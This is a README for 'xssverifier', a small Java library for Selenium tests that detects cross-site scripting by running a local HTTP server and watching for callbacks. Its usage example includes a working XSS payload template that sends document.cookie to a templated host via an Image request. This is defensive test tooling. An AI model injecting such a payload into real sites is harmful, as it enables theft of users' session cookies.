# xssverifier
A little project for XSS-safe verification for Selenium

        <dependency>
            <groupId>com.github.eljah</groupId>
            <artifactId>xssverifier</artifactId>
            <version>0.1</version>
        </dependency>

Usage example:
```java
XSSCheck x=XSSVerifier.createNewCheck(4567,"xss.gif","<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>");
/* 4567 is a port number where the XSS checker's embbedded http server runs, xss.gif is a resource, the last string is  javascript injection template*/

//check occurs behind the scene
//to ensure it works open localhost:4567/xss.gif in your browser

while (!x.getXSSURLCalledStatus())
{
    Thread.sleep(1000);
    System.out.println("wait 1...");
}

//the XSS host and resource were requested but not nessessarily some parameter was passed
//to ensure it works open localhost:4567/xss.gif?sometext in your browser

while (!x.getXSSCookiePassedStatus())
{
    Thread.sleep(1000);
    System.out.println("wait 2...");
}

//the XSS host and resource were requested and some parameter was passed but that was not the hijacked cookie
//to ensure it works open localhost:4567/xss.gif?visited=02022015 in your browser

while (!x.getXSSCookieHijacked("visited"))
{
    Thread.sleep(1000);
    System.out.println("wait 3...");
}

//the XSS host and resource were requested, some parameter was passed and this parameter is cookie named visited
//so the particular cookie was hijacked and that was verified
```
